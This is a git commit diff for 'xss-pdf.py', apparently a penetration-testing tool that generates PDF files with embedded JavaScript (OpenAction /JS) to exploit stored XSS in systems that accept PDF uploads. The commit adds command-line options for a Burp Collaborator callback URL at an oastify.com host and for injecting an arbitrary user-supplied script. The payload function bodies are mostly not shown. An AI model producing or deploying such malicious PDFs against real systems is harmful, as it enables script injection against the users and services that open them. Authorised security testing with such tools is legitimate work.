52ea37a2efb4771d7e41d2743c7009af743a82ff
Kaan Atmaca <katmaca@Kaans-MacBook-Air.local>
2023-12-03 15:43:17 +0300

    args added

--- README.md
+++ README.md
@@ -2,13 +2,17 @@
 
 How to install?
 git clone URL
-pip install -r requirement.txt
 
 Example Usage?
-python pdf.py -o=1 -u="BURP_URL" 
-python pdf.py -o=2 -sc="app.alert("MYSCRİPT")" 
-python -h 
+python -h
+python3 xss-pdf.py 
+python3 xss-pdf.py -o 1 -u http://n1pze4owqnry5tzzqngb5.oastify.com
+python3 xss-pdf.py -o 2 -sc app.alert(2) 
 
-Options:
-Option 1 -> creates malicous PDF files for stored xss vulnerability
-Option 2 -> allows user to create own PDF file with their personal scripts
+Option 1
+creates malicous PDF files for stored xss vulnerability
+
+Option 2
+allows user to create own PDF file with their personal scripts
+
+Open to new suggestions, please create an issue
--- xss-pdf.py
+++ xss-pdf.py
@@ -1,9 +1,7 @@
+import argparse
 import sys
 if sys.version_info[0] < 3:
     raise SystemExit("Use Python 3 (or higher) only")    
-import io
-import bz2
-import base64
 
 def create_malpdf1(filename):
     with open(filename, "w") as file:
@@ -46,6 +44,7 @@ def create_malpdf3(filename):
 
 def create_malpdf_input(filename, cin):
     with open(filename, "w") as file:
+        print("hello")
         file.write('''%PDF-1.7
         1 0 obj
         <</Pages 1 0 R /OpenAction 2 0 R>>
@@ -53,18 +52,60 @@ def create_malpdf_input(filename, cin):
         <</S /JavaScript /JS ('''+cin+'''
         )>> trailer <</Root 1 0 R>>''')
 
-#TODO: args options, add burp collab url option, add install req
+
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser( 
+    description="Create Malicous PDF Files Leading to XSS Exploit")
+
+    parser.add_argument(
+        '-u', action="store", default=None, dest='url',
+        help="Specify the Burp Collaborator URL (e.g., http://n1pze4owqnry5tzzqngb5.oastify.com)")
+    parser.add_argument(
+        '-o', action="store", default=1, dest='option', type=int,
+        help="Specify the create PDF option (e.g., 1)")
+    parser.add_argument(
+        '-sc', action="store", default=None, dest='script',
+        help="Specify your own Javascript code (e.g., app.alert(1))")
+
+    if len(sys.argv) <= 1:
+        parser.print_help()
+        print()
+        sys.exit()
+
+    args = parser.parse_args()
+    option = 1
+    burp = 0
+    urls = {}
+    script = ""
+
+    if args.option == 1:
+        if args.url:
+            if 'http://' in args.url or 'https://' in args.url:
+                proxies = {"http": args.url, "https": args.url}
+                burp = 1
+            else:
+                print(f"You have specified an invalid url: {args.url}")
+                print("Don't forget to include the schema (http|https)")
+                exit(1)
+
+    elif args.option == 2:
+        if args.script:
+            script = args.script
+        else: 
+            print(f"You have specified an invalid script: {args.script}")
+            print("For option 2 use the -sc command")
+            exit(1)
+        option = 2
+
     print("[+] Creating PDF files..")
     try: 
-        option = int(input("Input option 1 or 2: "))
         if option == 1: 
-            create_malpdf1("test.pdf")
-            create_malpdf2("test2.pdf")
-            create_malpdf3("test3.pdf")
+            create_malpdf1("xssPDF-1.pdf")
+            create_malpdf2("xssPDF-2.pdf")
+            if burp == 1:
+                create_malpdf3("xssPDF-3.pdf")
         elif option == 2:
-            cin = input("Input script: ")
-            create_malpdf_input("test_input.pdf", cin)
+            create_malpdf_input("xssPDF-my.pdf", script)
         print("[-] Done!")
     except: 
         print("Failed to create, must enter integer value 1 or 2...")
